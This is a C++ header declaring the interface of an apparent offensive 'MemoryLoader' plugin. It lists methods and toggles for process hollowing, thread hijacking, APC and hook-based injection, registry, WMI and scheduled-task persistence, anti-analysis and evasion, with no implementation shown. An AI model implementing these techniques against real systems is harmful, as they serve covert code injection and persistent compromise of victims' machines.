#pragma once
#include <string>
#include <vector>

// Configuration structure for memory loading
struct MemoryLoaderConfig {
    bool useReflectiveLoading;
    bool useProcessHollowing;
    bool useThreadHijacking;
    bool useAPCInjection;
    bool useSetWindowsHookEx;
    bool useRegistryPersistence;
    bool useWMIEventConsumer;
    bool useScheduledTask;
    bool addAntiAnalysis;
    bool addProcessEvasion;
};

// Memory Loader Plugin Interface
class MemoryLoader {
private:
    MemoryLoaderConfig config;

    // Utility functions
    std::string generateReflectiveLoader();
    std::string generateProcessHollowing();
    std::string generateThreadHijacking();
    std::string generateAPCInjection();
    std::string generateSetWindowsHookEx();
    std::string generateRegistryPersistence();
    std::string generateWMIEventConsumer();
    std::string generateScheduledTask();
    std::string generateAntiAnalysis();
    std::string generateProcessEvasion();

    // Menu handlers
    void handleReflectiveLoading();
    void handleProcessHollowing();
    void handleThreadHijacking();
    void handleAPCInjection();
    void handleSetWindowsHookEx();
    void handleRegistryPersistence();
    void handleWMIEventConsumer();
    void handleScheduledTask();
    void handleAntiAnalysis();
    void handleProcessEvasion();
    void handleConfiguration();
    void handleSaveConfiguration();
    void handleLoadConfiguration();

public:
    MemoryLoader();
    ~MemoryLoader();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);
    
    // Configuration persistence methods
    void saveConfiguration(const std::string& filePath);
    void loadConfiguration(const std::string& filePath);

    // Memory Loading Methods
    std::string createReflectiveLoader(const std::string& payloadPath);
    std::string createProcessHollowing(const std::string& targetProcess, const std::string& payloadPath);
    std::string createThreadHijacking(const std::string& targetProcess, const std::string& payloadPath);
    std::string createAPCInjection(const std::string& targetProcess, const std::string& payloadPath);
    std::string createSetWindowsHookEx(const std::string& payloadPath);
    std::string createRegistryPersistence(const std::string& payloadPath);
    std::string createWMIEventConsumer(const std::string& payloadPath);
    std::string createScheduledTask(const std::string& payloadPath);
    std::string createAntiAnalysis(const std::string& payloadPath);
    std::string createProcessEvasion(const std::string& payloadPath);

    // Configuration methods
    void setUseReflectiveLoading(bool use);
    void setUseProcessHollowing(bool use);
    void setUseThreadHijacking(bool use);
    void setUseAPCInjection(bool use);
    void setUseSetWindowsHookEx(bool use);
    void setUseRegistryPersistence(bool use);
    void setUseWMIEventConsumer(bool use);
    void setUseScheduledTask(bool use);
    void setAddAntiAnalysis(bool add);
    void setAddProcessEvasion(bool add);

    // Menu interface
    void showMenu();
};
